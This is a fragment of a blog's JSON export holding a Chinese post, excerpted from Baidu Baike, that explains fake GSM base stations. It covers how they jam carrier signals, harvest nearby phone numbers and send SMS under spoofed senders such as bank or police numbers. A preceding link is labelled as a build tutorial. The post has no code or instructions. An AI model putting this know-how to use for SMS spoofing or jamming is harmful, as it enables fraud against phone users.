href=\"http://www.wenku1.com/list/%E4%BC%AA%E5%9F%BA%E7%AB%99%E5%88%B6%E4%BD%9C%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">伪基站制作教程</a></p>\n"},{"title":"Pseudo Base Station","date":"2016-11-15T06:14:40.000Z","_content":"伪基站又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的SIM卡信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。\n![picture-1](/upload_image/wjz.jpg)\n\n## 工作原理:\n伪基站利用移动信令监测系统监测移动通讯设备过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度在60km/h，可以向附近用户群发短信，因此，伪基站具有一定的流动性。\n一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断有人手机被吸入。离得越近，被吸入的可能性越大。基本的比率是辐射区域内如果有一万人那么则有五千人会受到影响。\n![picture-2](/upload_image/weijizhan.jpg)\n\n## 设备原理\n它是利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。当用户的位置信息（Cell-id）与业务选择发送的特定区域一致时，为用户下发业务定制的短信。为获得准确、全面的用户信息（当前位置信息和用户手机号），信令检测系统需要监控移动通信网络中的相关信令链路，包括：MSC到BSC之间的信令链路、MSC到HLR之间的信令链路、MSC到其它MSC之间的信令链路以及MSC到LSTP之间的信令链路。\n也就是伪基站启动你，干扰和屏蔽一定范围内的运营商信号，伪基站趁着这个时间搜索出周围的手机号，并将短信发送到这些号码上。屏蔽运营商的信号，能持续10秒到20秒，短信推送完了，对方手机才能重新连接到运营商信号。有很多的用户的信号不能自动恢复，需要重新启动。伪基站能把发送号码显示为任意号码，甚至是邮箱号，110都可以。\n\n## 特点：\n可以随意更改发送的号码，可以选择尾号较好的号码，还可以使用尾数为10086和95588等号码。流动性大，造成影响巨大。\n\n\n【摘录自百度百科】等\nsigned by bman\n\n","source":"_posts/伪基站.md","raw":"---\ntitle: Pseudo Base Station\ndate: 2016-11-15 14:14:40\ntags:\n---\n伪基站又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的SIM卡信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。\n![picture-1](/upload_image/wjz.jpg)\n\n## 工作原理:\n伪基站利用移动信令监测系统监测移动通讯设备过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度在60km/h，可以向附近用户群发短信，因此，伪基站具有一定的流动性。\n一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断有人手机被吸入。离得越近，被吸入的可能性越大。基本的比率是辐射区域内如果有一万人那么则有五千人会受到影响。\n![picture-2](/upload_image/weijizhan.jpg)\n\n## 设备原理\n它是利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。当用户的位置信息（Cell-id）与业务选择发送的特定区域一致时，为用户下发业务定制的短信。为获得准确、全面的用户信息（当前位置信息和用户手机号），信令检测系统需要监控移动通信网络中的相关信令链路，包括：MSC到BSC之间的信令链路、MSC到HLR之间的信令链路、MSC到其它MSC之间的信令链路以及MSC到LSTP之间的信令链路。\n也就是伪基站启动你，干扰和屏蔽一定范围内的运营商信号，伪基站趁着这个时间搜索出周围的手机号，并将短信发送到这些号码上。屏蔽运营商的信号，能持续10秒到20秒，短信推送完了，对方手机才能重新连接到运营商信号。有很多的用户的信号不能自动恢复，需要重新启动。伪基站能把发送号码显示为任意号码，甚至是邮箱号，110都可以。\n\n## 特点：\n可以随意更改发送的号码，可以选择尾号较好的号码，还可以使用尾数为10086和95588等号码。流动性大，造成影响巨大。\n\n\n【摘录自百度百科】等\nsigned by bman\n\n","slug":"伪基站","published":1,"updated":"2017-05-31T07:58:06.621Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g13e000kjoo5vrx53sfc","content":"<p>伪基站又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的SIM卡信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。<br><img src=\"/upload_image/wjz.jpg\" alt=\"picture-1\"></p>\n<h2 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理:\"></a>工作原理:</h2><p>伪基站利用移动信令监测系统监测移动通讯设备过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度在60km/h，可以向附近用户群发短信，因此，伪基站具有一定的流动性。<br>一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断有人手机被吸入。离得越近，被吸入的可能性越大。基本的比率是辐射区域内如果有一万人那么则有五千人会受到影响。<br><img src=\"/upload_image/weijizhan.jpg\" alt=\"picture-2\"></p>\n<h2 id=\"设备原理\"><a href=\"#设备原理\" class=\"headerlink\" title=\"设备原理\"></a>设备原理</h2><p>它是利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。当用户的位置信息（Cell-id）与业务选择发送的特定区域一致时，为用户下发业务定制的短信。为获得准确、全面的用户信息（当前位置信息和用户手机号），信令检测系统需要监控移动通信网络中的相关信令链路，包括：MSC到BSC之间的信令链路、MSC到HLR之间的信令链路、MSC到其它MSC之间的信令链路以及MSC到LSTP之间的信令链路。<br>也就是伪基站启动你，干扰和屏蔽一定范围内的运营商信号，伪基站趁着这个时间搜索出周围的手机号，并将短信发送到这些号码上。屏蔽运营商的信号，能持续10秒到20秒，短信推送完了，对方手机才能重新连接到运营商信号。有很多的用户的信号不能自动恢复，需要重新启动。伪基站能把发送号码显示为任意号码，甚至是邮箱号，110都可以。</p>\n<h2 id=\"特点：\"><a href=\"#特点：\" class=\"headerlink\" title=\"特点：\"></a>特点：</h2><p>可以随意更改发送的号码，可以选择尾号较好的号码，还可以使用尾数为10086和95588等号码。流动性大，造成影响巨大。</p>\n<p>【摘录自百度百科】等<br>signed by bman</p>\n","site":{"data":{}},"excerpt":"","more":"<p>伪基站又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的SIM卡信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。<br><img src=\"/upload_image/wjz.jpg\" alt=\"picture-1\"></p>\n<h2 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理:\"></a>工作原理:</h2><p>伪基站利用移动信令监测系统监测移动通讯设备过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度在60km/h，可以向附近用户群发短信，因此，伪基站具有一定的流动性。<br>一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断有人手机被吸入。离得越近，被吸入的可能性越大。基本的比率是辐射区域内如果有一万人那么则有五千人会受到影响。<br><img src=\"/upload_image/weijizhan.jpg\" alt=\"picture-2\"></p>\n<h2 id=\"设备原理\"><a href=\"#设备原理\" class=\"headerlink\" title=\"设备原理\"></a>设备原理</h2><p>它是利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。当用户的位置信息（Cell-id）与业务选择发送的特定区域一致时，为用户下发业务定制的短信。为获得准确、全面的用户信息（当前位置信息和用户手机号），信令检测系统需要监控移动通信网络中的相关信令链路，包括：MSC到BSC之间的信令链路、MSC到HLR之间的信令链路、MSC到其它MSC之间的信令链路以及MSC到LSTP之间的信令链路。<br>也就是伪基站启动你，干扰和屏蔽一定范围内的运营商信号，伪基站趁着这个时间搜索出周围的手机号，并将短信发送到这些号码上。屏蔽运营商的信号，能持续10秒到20秒，短信推送完了，对方手机才能重新连接到运营商信号。有很多的用户的信号不能自动恢复，需要重新启动。伪基站能把发送号码显示为任意号码，甚至是邮箱号，110都可以。</p>\n<h2 id=\"特点：\"><a href=\"#特点：\" class=\"headerlink\" title=\"特点：\"></a>特点：</h2><p>可以随意更改发送的号码，可以选择尾号较好的号码，还可以使用尾数为10086和95588等号码。流动性大，造成影响巨大。</p>\n<p>【摘录自百度百科】等<br>signed by bman</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}